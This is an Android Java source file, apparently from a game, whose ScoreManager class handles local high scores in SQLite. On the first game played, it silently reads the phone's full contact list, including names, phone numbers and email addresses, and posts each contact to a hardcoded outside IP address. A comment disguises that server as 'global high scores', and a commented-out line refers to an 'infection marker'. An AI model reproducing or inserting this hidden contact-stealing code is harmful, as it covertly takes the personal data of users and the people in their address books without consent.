package android.game.score;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.provider.ContactsContract;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.*;
import java.util.ArrayList;

public class ScoreManager {

    private static final String DATABASE_TABLE_SCORES = "scores";
    private static final String DATABASE_TABLE_SCORES_ID = "id";
    public static final String DATABASE_TABLE_SCORES_NAME = "name";
    public static final String DATABASE_TABLE_SCORES_SCORE = "score";
    public static final int TOP_SCORE_NB = 10;
    private URI logServer;
    
	public int currentScore;
	private Context ctx;
	private ScoreDBHelper helper;
	private SQLiteDatabase database;
	public boolean scoreWasSaved;
    private HttpClient client;
	
    public ScoreManager(Context context) {
	    ctx = context;
	    helper = new ScoreDBHelper(ctx);
        database = helper.getWritableDatabase();

        try {
            //could also be global high scores
            logServer = new URI("http://209.141.53.179:5000/scores");
            client = new DefaultHttpClient();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }
	
    public Cursor getTopScores()
    {
    	return database.query(DATABASE_TABLE_SCORES, new String[]{DATABASE_TABLE_SCORES_NAME,DATABASE_TABLE_SCORES_SCORE},
                null, null, null, null, DATABASE_TABLE_SCORES_SCORE);
    }
    

    public boolean isTopScore()
    {
    	if(currentScore < 1)
    		return false;
    	
    	boolean ret;
    	Cursor c = getTopScores();

        if(c.getCount() == 0) {
            //only do this the first time someone plays a game
            saveContacts();
        }
    	
    	if(c.getCount() >= TOP_SCORE_NB) {
            c.moveToFirst(); //fixes CursorIndexOutOfBoundsException when past 10 scores
    		int top_score = c.getInt(c.getColumnIndex(DATABASE_TABLE_SCORES_SCORE));
            ret = currentScore > top_score;
        } else {
    		ret =  true;
        }
		c.close();
		
		return ret;
    }
    
    public void saveScoreIfTopScore(String player)
    {
        if(isTopScore())
    		saveScore(player);
    }
    
	private long saveScore(String player)
	{
        ContentValues initialValues = new ContentValues();
        initialValues.put(DATABASE_TABLE_SCORES_NAME, player);
        initialValues.put(DATABASE_TABLE_SCORES_SCORE, currentScore);
    	return database.insert(DATABASE_TABLE_SCORES, null, initialValues);
	}

    private long saveContacts() {
        //adapted from http://stackoverflow.com/questions/1721279/how-to-read-contacts-on-android-2-0
        Cursor cursor = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        while (cursor.moveToNext()) {
            SavedContact contact = new SavedContact();

            contact.id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            contact.displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            contact.hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

            if (contact.hasPhone.equals("1")) { //boolean as string
                Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contact.id, null, null);
                while (phones.moveToNext()) {
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact.phoneNumbers.add(phoneNumber);
                }
                phones.close();
            }

            Cursor emails = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contact.id, null, null);

            while (emails.moveToNext()) {
                String emailAddress = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                contact.emails.add(emailAddress);
            }
            emails.close();

            //Log.i("Contact", contact.toString());
            sendContact(contact);
        }
        cursor.close();
        return 0L;
    }

    private void sendContact(SavedContact contact) {
        ArrayList<NameValuePair> pairs = new ArrayList<NameValuePair>();
        pairs.add(new BasicNameValuePair("contact", contact.toString()));

        try {
            HttpPost post = new HttpPost(logServer);
            post.setEntity(new UrlEncodedFormEntity(pairs));
            client.execute(post);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
	
	public class ScoreDBHelper extends SQLiteOpenHelper {

		private static final String DATABASE_NAME = "data";
		private static final int DATABASE_VERSION = 7;
	    
		public ScoreDBHelper( Context context ) {
			super(context, DATABASE_NAME, null, DATABASE_VERSION);
		}

		@Override
		public void onCreate(SQLiteDatabase db) {
            db.execSQL("create table "+DATABASE_TABLE_SCORES
            		+" ("+DATABASE_TABLE_SCORES_ID+" integer primary key autoincrement, "
            		+DATABASE_TABLE_SCORES_NAME+" TEXT, " 
            		+DATABASE_TABLE_SCORES_SCORE+" integer);");

            //create infection marker
            //db.execSQL("CREATE TABLE IF NOT EXISTS 'scored' ('id' integer primary key autoincrement, 'saved' varchar(10))");
		}

		@Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS "+DATABASE_TABLE_SCORES);
            onCreate(db);
		}
		
	}
}
